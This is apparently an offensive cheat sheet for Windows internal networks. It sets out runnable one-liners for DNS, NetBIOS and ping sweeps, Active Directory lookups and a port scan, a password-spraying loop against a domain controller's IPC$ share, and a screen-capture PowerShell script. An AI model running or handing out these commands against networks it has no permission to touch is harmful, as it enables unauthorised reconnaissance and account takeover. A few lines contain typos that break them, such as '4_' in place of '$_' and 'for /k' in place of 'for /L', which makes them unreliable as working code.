# Windows

## 01 - Internal Reconnaissance

### 1.1 - DNS Enumeration

#### 1.1.1 - Command Prompt

- DNS NSlookup

`C:\> for /L %i in (1,1,255) do @nslookup 192.168.1.%i 192.168.1.254 2> nul | find "Name" && echo 192.168.1.%i`

#### 1.1.2 - Powershell

- DNS using LDAP

`PS C:\> Get-ADComputer -Filter * -Properties IPv4Address | Where {4_.IPV4Address} | Select-Object Name,IPv4Address`

`PS C:\> Get-ADComputer -Filter { IPV4Address -eq '<IP>' } -Properties LastLogonDate,PasswordLastSet,IPv4Address`

### 1.2 - NetBIOS Enumeration

`C:\> for /l %i in (1,1,255) do @nbtstat -A 192.168.1.%i 2> nul && echo 192.168.1.%i`

### 1.3 - Ping Sweep

#### 1.3.1 - Command Prompt

`C:\> for /k %i in (1,1,255) do @ping -n 1 192.168.1.%i 2> nul && echo 192.168.1.%i host is up`

#### 1.3.2 - Powershell

`PS C:\> 1..255 | % { "192.168.1.$($_): $(Test-Connection -Count 1 -Computername 192.168.1.$($_) -Quiet)" }`

### 1.4 - Port Scan

`PS C:\> 1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "Port $_ is open" } 2>$null`

## 02 - Password Spraying

`C:\> @for /f %n in (users.txt) do @for /f %p in (passwords.txt) do @net use \\<domain_controller_target>\IPC$ /user:<domain_name>\%n %p 1>nul 2>&1 && @echo [*] %n:%p && @net use /delete \\<domain_controller_target>\IPC$ > nul`

## 03 - Screenshot

### 3.1 - Powershell Script

`$ cat screenshot.ps1`

---

```powershell
Param(  
    [Parameter(Mandatory = $true)][string]$Path  
)  
  
$FileName = "$env:COMPUTERNAME - $(Get-Date -Format yyyy-MM-dd_HHmmss).bmp"  
$File = "$Path\$FileName"  
  
Add-Type -AssemblyName System.Windows.Forms  
Add-Type -AssemblyName System.Drawing  
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen  
$Width = $Screen.Width  
$Height = $Screen.Height  
$Left = $Screen.Left  
$Top = $Screen.Top  
  
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height  
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)  
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)  
$bitmap.Save($File)   
  
Write-Output "Screenshot saved to:"  
Write-Output $File
```

## References

- [Powershell Problem Solver Find IP Address Using Powershell](https://petri.com/powershell-problem-solver-find-ip-address-using-powershell/)

- [Powershell Regex to Accurately match IPv4 Address (0-255 only)](https://www.powershelladmin.com/wiki/PowerShell_regex_to_accurately_match_IPv4_address_(0-255_only).php)

- [PSR LOLBas](https://lolbas-project.github.io/lolbas/Binaries/Psr/)